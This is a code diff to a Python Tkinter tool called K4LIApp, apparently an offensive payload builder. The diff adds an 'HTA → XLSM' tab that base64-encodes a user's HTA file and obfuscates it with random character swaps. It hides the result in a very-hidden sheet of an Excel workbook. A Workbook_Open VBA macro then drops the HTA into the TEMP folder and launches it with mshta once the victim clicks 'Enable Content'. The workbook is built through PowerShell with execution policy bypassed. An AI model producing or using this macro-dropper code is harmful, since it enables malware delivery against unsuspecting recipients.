@@ -98,9 +98,15 @@ class K4LIApp:
         self.motw_out_var  = tk.StringVar(value="")
         self.motw_running  = False
 
+        # XLSM tab state
+        self.xlsx_hta_path = tk.StringVar(value="")
+        self.xlsx_out_var  = tk.StringVar(value="")
+        self.xlsx_running  = False
+
         self._prot_canvas  = None
         self._conv_canvas  = None
         self._motw_canvas  = None
+        self._xlsx_canvas  = None
         self._active_scroll_canvas = None
 
         self._build()
@@ -181,18 +187,25 @@ class K4LIApp:
                                    fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
                                    padx=22, pady=5, cursor="hand2",
                                    command=lambda: self._sw("motw"))
+        self.btn_xlsx = tk.Button(bar, text="HTA → XLSM", font=F_TAB,
+                                   fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
+                                   padx=22, pady=5, cursor="hand2",
+                                   command=lambda: self._sw("xlsx"))
         self.btn_prot.pack(side="left", padx=(18, 4), pady=4)
         self.btn_conv.pack(side="left", padx=(0, 4), pady=4)
         self.btn_motw.pack(side="left", padx=(0, 4), pady=4)
+        self.btn_xlsx.pack(side="left", padx=(0, 4), pady=4)
 
     def _sw(self, tab: str):
         self.active_tab = tab
         self.frm_prot.pack_forget()
         self.frm_conv.pack_forget()
         self.frm_motw.pack_forget()
+        self.frm_xlsx.pack_forget()
         self.btn_prot.configure(fg=C_G3, bg=BG_ROOT)
         self.btn_conv.configure(fg=C_G3, bg=BG_ROOT)
         self.btn_motw.configure(fg=C_G3, bg=BG_ROOT)
+        self.btn_xlsx.configure(fg=C_G3, bg=BG_ROOT)
         if tab == "protect":
             self.btn_prot.configure(fg=C_WH, bg=BG_CARD)
             self.frm_prot.pack(fill="both", expand=True)
@@ -201,6 +214,10 @@ class K4LIApp:
             self.btn_conv.configure(fg=C_WH, bg=BG_CARD)
             self.frm_conv.pack(fill="both", expand=True)
             self._active_scroll_canvas = self._conv_canvas
+        elif tab == "xlsx":
+            self.btn_xlsx.configure(fg=C_WH, bg=BG_CARD)
+            self.frm_xlsx.pack(fill="both", expand=True)
+            self._active_scroll_canvas = self._xlsx_canvas
         else:
             self.btn_motw.configure(fg=C_WH, bg=BG_CARD)
             self.frm_motw.pack(fill="both", expand=True)
@@ -212,9 +229,11 @@ class K4LIApp:
         self.frm_prot = tk.Frame(c, bg=BG_ROOT)
         self.frm_conv = tk.Frame(c, bg=BG_ROOT)
         self.frm_motw = tk.Frame(c, bg=BG_ROOT)
+        self.frm_xlsx = tk.Frame(c, bg=BG_ROOT)
         self._build_protect_tab()
         self._build_convert_tab()
         self._build_motw_tab()
+        self._build_xlsx_tab()
         self._sw("protect")
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -3293,6 +3312,296 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
 
     def _sleep(self, s: float):
         time.sleep(s)
+
+    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    #  HTA → XLSM TAB
+    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    def _build_xlsx_tab(self):
+        p = self.frm_xlsx
+        _scroll_inner, self._xlsx_canvas = self._scrollable_frame(p)
+        wrap = tk.Frame(_scroll_inner, bg=BG_ROOT, padx=22, pady=16)
+        wrap.pack(fill="both", expand=True)
+
+        # ── Info banner ───────────────────────────────────────────────────
+        info = tk.Frame(wrap, bg=BG_CARD, padx=14, pady=10)
+        info.pack(fill="x", pady=(0, 14))
+        tk.Label(info, text="HTA → XLSM  (Excel Macro-Enabled Workbook)",
+                 font=("Segoe UI", 9, "bold"), fg=C_GRN, bg=BG_CARD,
+                 anchor="w").pack(fill="x")
+        tk.Label(info,
+                 text="Embeds your .hta inside an Excel .xlsm file using VBA macro.\n"
+                      "User opens .xlsm → clicks Enable Content → HTA launches automatically.\n"
+                      "Requires: Microsoft Excel installed on target machine.",
+                 font=F_SM, fg=C_G2, bg=BG_CARD, anchor="w", justify="left"
+                 ).pack(fill="x", pady=(4, 0))
+
+        # ── HTA picker ────────────────────────────────────────────────────
+        self._lbl(wrap, "SELECT  .HTA  FILE").pack(fill="x", pady=(0, 5))
+        row_hta = tk.Frame(wrap, bg=BG_ROOT)
+        row_hta.pack(fill="x", pady=(0, 14))
+        pb = tk.Frame(row_hta, bg=BD_MID, padx=1, pady=1)
+        pb.pack(side="left", fill="x", expand=True)
+        pbi = tk.Frame(pb, bg=BG_IN)
+        pbi.pack(fill="x")
+        self.xlsx_hta_lbl = tk.Label(pbi, textvariable=self.xlsx_hta_path,
+                                      font=F_MONO, fg=C_G3, bg=BG_IN,
+                                      anchor="w", padx=10, pady=7)
+        self.xlsx_hta_lbl.pack(fill="x")
+        self._sq_btn(row_hta, "PICK .HTA", self._pick_xlsx_hta,
+                     fg=C_WH, bg=BG_IN, hover=BG_HOV
+                     ).pack(side="right", padx=(8, 0))
+
+        # ── Output path ───────────────────────────────────────────────────
+        self._lbl(wrap, "OUTPUT  FILE  (auto-named  .xlsm)").pack(fill="x", pady=(0, 5))
+        out_brd = tk.Frame(wrap, bg=BD_MID, padx=1, pady=1)
+        out_brd.pack(fill="x", pady=(0, 14))
+        out_inn = tk.Frame(out_brd, bg=BG_IN)
+        out_inn.pack(fill="x")
+        self.xlsx_out_lbl = tk.Label(out_inn, textvariable=self.xlsx_out_var,
+                                      font=F_MONO, fg=C_G3, bg=BG_IN,
+                                      anchor="w", padx=10, pady=7)
+        self.xlsx_out_lbl.pack(fill="x")
+
+        # ── Action button ─────────────────────────────────────────────────
+        act = tk.Frame(wrap, bg=BG_ROOT)
+        act.pack(fill="x", pady=(0, 14))
+        self.xlsx_btn = self._sq_btn(act, "  CREATE  XLSM",
+                                      self._start_xlsx,
+                                      fg=BG_ROOT, bg=C_GRN, hover="#22c55e",
+                                      font=F_BTN_LG, padx=28, pady=10)
+        self.xlsx_btn.pack(fill="x")
+
+        # ── Log ───────────────────────────────────────────────────────────
+        lgh = tk.Frame(wrap, bg=BG_ROOT)
+        lgh.pack(fill="x", pady=(0, 4))
+        tk.Label(lgh, text="OUTPUT  LOG", font=F_HDR, fg=C_G3,
+                 bg=BG_ROOT).pack(side="left")
+        tk.Button(lgh, text="CLEAR", font=("Segoe UI", 8), fg=C_G3,
+                  bg=BG_ROOT, relief="flat", bd=0, cursor="hand2",
+                  command=self._clear_xlsx_log).pack(side="right")
+
+        lo = tk.Frame(wrap, bg=BD_DIM, padx=1, pady=1)
+        lo.pack(fill="both", expand=True)
+        li = tk.Frame(lo, bg=BG_IN)
+        li.pack(fill="both", expand=True)
+        self.xlsx_log = tk.Text(li, bg=BG_IN, fg=C_G1, font=F_MONO,
+                                 relief="flat", bd=0, height=14,
+                                 wrap="word", cursor="arrow",
+                                 state="disabled")
+        sb = tk.Scrollbar(li, orient="vertical",
+                          command=self.xlsx_log.yview, bg=BG_IN)
+        self.xlsx_log.configure(yscrollcommand=sb.set)
+        sb.pack(side="right", fill="y")
+        self.xlsx_log.pack(fill="both", expand=True, padx=6, pady=6)
+
+        for tag, col in [("wh", C_WH), ("gn", C_GRN), ("cy", C_CYN),
+                         ("am", C_AMB), ("rd", C_RED), ("g2", C_G2),
+                         ("g3", C_G3), ("dm", BD_MID)]:
+            self.xlsx_log.tag_config(tag, foreground=col)
+
+        self._xlsx_ln("[XLSM]  HTA → Excel Macro Wrapper", "wh")
+        self._xlsx_ln("        Pick your .hta then click CREATE XLSM.", "g3")
+        self._xlsx_ln("", None)
+
+    def _xlsx_ln(self, text: str, tag):
+        def _do():
+            self.xlsx_log.configure(state="normal")
+            if tag:
+                self.xlsx_log.insert("end", text + "\n", tag)
+            else:
+                self.xlsx_log.insert("end", text + "\n")
+            self.xlsx_log.see("end")
+            self.xlsx_log.configure(state="disabled")
+        self.root.after(0, _do)
+
+    def _clear_xlsx_log(self):
+        self.xlsx_log.configure(state="normal")
+        self.xlsx_log.delete("1.0", "end")
+        self.xlsx_log.configure(state="disabled")
+        self._xlsx_ln("[XLSM]  Log cleared.", "g3")
+
+    def _pick_xlsx_hta(self):
+        path = filedialog.askopenfilename(
+            title="Select HTA File",
+            filetypes=[("HTA files", "*.hta"), ("All files", "*.*")]
+        )
+        if not path:
+            return
+        self.xlsx_hta_path.set(path)
+        self.xlsx_hta_lbl.configure(fg=C_G1)
+        stem = Path(path).stem
+        out_name = f"{stem}.xlsm"
+        self.xlsx_out_var.set(str(Path(path).parent / out_name))
+        self.xlsx_out_lbl.configure(fg=C_GRN)
+        sz = os.path.getsize(path)
+        szs = f"{sz/1024:.1f} KB" if sz < 1_048_576 else f"{sz/1_048_576:.2f} MB"
+        self._xlsx_ln(f"[HTA]   {Path(path).name}  ({szs})", "wh")
+        self._xlsx_ln(f"[OUT]   {out_name}", "gn")
+
+    def _start_xlsx(self):
+        if self.xlsx_running:
+            return
+        hta_path = self.xlsx_hta_path.get()
+        if not hta_path or not os.path.isfile(hta_path):
+            self._xlsx_ln("[ERROR]  No .hta file selected.", "rd")
+            return
+        self.xlsx_running = True
+        self.xlsx_btn.configure(state="disabled", fg=C_G3, bg=BG_CARD)
+        threading.Thread(target=self._run_xlsx, daemon=True).start()
+
+    def _run_xlsx(self):
+        import tempfile, shutil, base64, random
+        try:
+            hta_path = Path(self.xlsx_hta_path.get())
+            out_xlsm = hta_path.parent / f"{hta_path.stem}.xlsm"
+            tmp_dir  = Path(tempfile.mkdtemp(prefix="k4li_xlsx_"))
+
+            self._xlsx_ln("\n[1/4]  Reading & encoding HTA...", "cy")
+            hta_data = hta_path.read_bytes()
+            hta_b64  = base64.b64encode(hta_data).decode("ascii")
+
+            # char-swap obfuscation (same approach as HTA bundler)
+            _b64pool = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
+            random.shuffle(_b64pool)
+            _swaps = [(_b64pool[i], _b64pool[i + 1]) for i in range(0, 12, 2)]
+            for _sa, _sb in _swaps:
+                hta_b64 = hta_b64.replace(_sa, "~").replace(_sb, _sa).replace("~", _sb)
+            _swap_vba = ""
+            for _sa, _sb in reversed(_swaps):
+                _swap_vba += (f'  sB = Replace(sB, "{_sa}", "~") : '
+                              f'sB = Replace(sB, "{_sb}", "{_sa}") : '
+                              f'sB = Replace(sB, "~", "{_sb}")\n')
+
+            sz_kb = len(hta_data) / 1024
+            szs   = f"{sz_kb:.1f} KB" if sz_kb < 1024 else f"{sz_kb/1024:.2f} MB"
+            self._xlsx_ln(f"       HTA: {szs}  |  b64: {len(hta_b64)//1024} KB  ✓", "g3")
+
+            # Write b64 chunks to file (1 chunk per line, 900 chars each)
+            b64_file = tmp_dir / "data.b64"
+            chunk_size = 900
+            chunks = [hta_b64[i:i + chunk_size]
+                      for i in range(0, len(hta_b64), chunk_size)]
+            b64_file.write_text("\n".join(chunks), encoding="ascii")
+
+            # VBA macro — reads chunks from hidden sheet, decodes, runs HTA
+            tmp_hta_name = hta_path.stem + ".hta"
+            vba_code = (
+                'Private Sub Workbook_Open()\n'
+                '  On Error Resume Next\n'
+                '  Dim ws As Object\n'
+                '  Set ws = ThisWorkbook.Sheets("_d")\n'
+                '  If ws Is Nothing Then Exit Sub\n'
+                '  Dim sB As String : sB = ""\n'
+                '  Dim i As Long : i = 1\n'
+                '  Do While ws.Cells(i, 1).Value <> ""\n'
+                '    sB = sB & ws.Cells(i, 1).Value\n'
+                '    i = i + 1\n'
+                '  Loop\n'
+                + _swap_vba
+                + '  Dim c1 As String : c1 = "MSXML2." & "DOMDocument"\n'
+                  '  Dim xml As Object : Set xml = CreateObject(c1)\n'
+                  '  Dim nd As Object : Set nd = xml.createElement("b")\n'
+                  '  nd.DataType = "bin.base64"\n'
+                  '  nd.Text = sB\n'
+                  '  Dim c2 As String : c2 = "ADODB." & "Stream"\n'
+                  '  Dim stm As Object : Set stm = CreateObject(c2)\n'
+                  '  stm.Type = 1 : stm.Open\n'
+                  '  stm.Write nd.nodeTypedValue\n'
+                  '  Dim tmpPath As String\n'
+                + f'  tmpPath = Environ("TEMP") & "\\{tmp_hta_name}"\n'
+                  '  stm.SaveToFile tmpPath, 2\n'
+                  '  stm.Close\n'
+                  '  Shell "mshta.exe """ & tmpPath & """"\n'
+                  'End Sub\n'
+            )
+            vba_file = tmp_dir / "macro.txt"
+            vba_file.write_text(vba_code, encoding="utf-8")
+
+            self._xlsx_ln(f"\n[2/4]  VBA macro ready  ({len(chunks)} data chunks)  ✓", "cy")
+
+            # PowerShell: create .xlsm via Excel COM
+            ps_out = str(out_xlsm).replace("\\", "\\\\")
+            b64_in = str(b64_file).replace("\\", "\\\\")
+            vba_in = str(vba_file).replace("\\", "\\\\")
+
+            ps_script = (
+                '$ErrorActionPreference = "Stop"\n'
+                '$xl = New-Object -ComObject Excel.Application\n'
+                '$xl.Visible = $false\n'
+                '$xl.DisplayAlerts = $false\n'
+                'try {\n'
+                '  $wb = $xl.Workbooks.Add()\n'
+                '  $ws1 = $wb.Worksheets.Item(1)\n'
+                '  $ws1.Name = "Sheet1"\n'
+                '  $ws1.Cells(1,1).Value2 = "Document"\n'
+                '  $wd = $wb.Worksheets.Add()\n'
+                '  $wd.Name = "_d"\n'
+                '  $wd.Visible = 2\n'
+                f'  $lines = [System.IO.File]::ReadAllLines("{b64_in}")\n'
+                '  for ($i = 0; $i -lt $lines.Length; $i++) {\n'
+                '    $wd.Cells($i+1, 1).Value2 = $lines[$i]\n'
+                '  }\n'
+                f'  $vba = [System.IO.File]::ReadAllText("{vba_in}")\n'
+                '  $wb.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString($vba)\n'
+                f'  $wb.SaveAs("{ps_out}", 52)\n'
+                '  $wb.Close($false)\n'
+                '  Write-Host "OK"\n'
+                '} finally {\n'
+                '  $xl.Quit()\n'
+                '  [System.Runtime.InteropServices.Marshal]::ReleaseComObject($xl) | Out-Null\n'
+                '}\n'
+            )
+            ps_file = tmp_dir / "make_xlsm.ps1"
+            ps_file.write_text(ps_script, encoding="utf-8")
+
+            self._xlsx_ln("\n[3/4]  Creating XLSM via Excel COM...", "cy")
+            self._xlsx_ln("       (Excel will open briefly in background)", "g3")
+
+            r = subprocess.run(
+                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+                 "-File", str(ps_file)],
+                capture_output=True, text=True, timeout=120
+            )
+
+            self._xlsx_ln("\n[4/4]  Verifying output...", "cy")
+
+            if out_xlsm.exists():
+                sz2  = out_xlsm.stat().st_size
+                szs2 = f"{sz2/1024:.1f} KB" if sz2 < 1_048_576 else f"{sz2/1_048_576:.2f} MB"
+                self._xlsx_ln(f"       {out_xlsm.name}  ({szs2})  ✓", "gn")
+                self._xlsx_ln("\n" + "─" * 60, "dm")
+                self._xlsx_ln("[OK]    XLSM created successfully.", "gn")
+                self._xlsx_ln(f"        File : {out_xlsm}", "g2")
+                self._xlsx_ln("─" * 60, "dm")
+                self._xlsx_ln(
+                    "\n[INFO]  User opens .xlsm → clicks 'Enable Content'\n"
+                    "        → HTA launches automatically  ✓", "cy")
+                self._xlsx_ln(
+                    "[NOTE]  Requires: Microsoft Excel on target machine.", "am")
+            else:
+                self._xlsx_ln("[ERROR]  XLSM not created.", "rd")
+                combined = (r.stdout or "") + (r.stderr or "")
+                if "VBProject" in combined or "programmatic" in combined.lower():
+                    self._xlsx_ln(
+                        "[FIX]   Excel → File → Options → Trust Center\n"
+                        "        → Trust Center Settings → Macro Settings\n"
+                        "        → Enable: 'Trust access to VBA project object model'",
+                        "am")
+                elif combined.strip():
+                    self._xlsx_ln(combined[:600], "rd")
+
+        except subprocess.TimeoutExpired:
+            self._xlsx_ln("[ERROR]  Excel COM timed out (120s).", "rd")
+        except Exception as e:
+            self._xlsx_ln(f"\n[ERROR]  {e}", "rd")
+        finally:
+            try:
+                shutil.rmtree(str(tmp_dir), ignore_errors=True)
+            except Exception:
+                pass
+            self.xlsx_running = False
+            self.root.after(0, lambda: self.xlsx_btn.configure(
+                state="normal", fg=BG_ROOT, bg=C_GRN))
 
     def _set_prog(self, pct: int):
         def _do():
